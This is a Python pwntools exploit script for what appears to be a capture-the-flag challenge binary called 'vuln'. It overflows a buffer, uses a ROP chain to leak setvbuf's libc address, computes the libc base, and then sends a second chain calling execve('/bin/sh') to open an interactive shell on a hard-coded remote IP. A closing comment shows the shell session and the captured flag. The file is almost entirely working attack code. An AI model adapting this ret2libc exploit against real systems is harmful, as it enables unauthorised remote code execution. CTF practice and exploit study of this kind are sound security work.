# Imports
import re, sys, time
from pwn import *
# Set pwntools context to amd64
context.update(arch='amd64')

# Global debug flag
DEBUG = True

def rop_puts(elf):
  """
  Builds a rop chain payload to dump the GOT address of setvbuf.
  """ 
  rop = ROP(elf)
  # Leak setvbuf libc address
  rop.puts(elf.got['setvbuf'])

  rop.raw(0x401146)

  return (bytes(rop))

def rop_execve(libc):
  """
  Builds a rop chain to call execve("/bin/sh\x00", 0, 0).
  """ 
  rop = ROP(libc)

  rop.execve(next(libc.search(b'/bin/sh\x00')), 0, 0)

  return (bytes(rop))

def main():
  """
  Runs on program execution.
  """
  # Read challenge binary into pwntools
  elf = ELF('vuln')

  # Read libc into pwntools and connect to the challenge binary
  if DEBUG:
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    p = remote('localhost', 1111)
    print("Connected to challenge and waiting for debugger to attach. Press any key to continue...")
    sys.stdin.read(1)
  else:
    libc = ELF('libc6_2.27-3ubuntu1_amd64.so')
    p = remote('35.188.73.186', 1111)

  p.recvline()

  p.sendline(b'A' * 256 + b'ADDRHERE' + rop_puts(elf) + b'C' * 8)
  time.sleep(.5)
  
  setvbuf_addr = (p.recv().split(b'ADDRHERE'))[1].split(b'\n')[1]
  setvbuf_addr = setvbuf_addr.strip().ljust(8, b'\x00')
  setvbuf_addr = u64(setvbuf_addr)
  print("setvbuf address: 0x%016x" % setvbuf_addr)

  libc.address = setvbuf_addr - libc.symbols['setvbuf']

  time.sleep(.5)

  p.sendline(b'A' * 264 + rop_execve(libc))

  p.interactive()

  """
  $ id
  uid=1000(vuln) gid=1000(vuln) groups=1000(vuln)
  $ cat /home/vuln/flag.txt
  rooters{L0l_W3lc0m3_70_7h3_0f_Pwn1ng}ctf
  $  
  """
# Hook
if __name__ == '__main__':
  main()
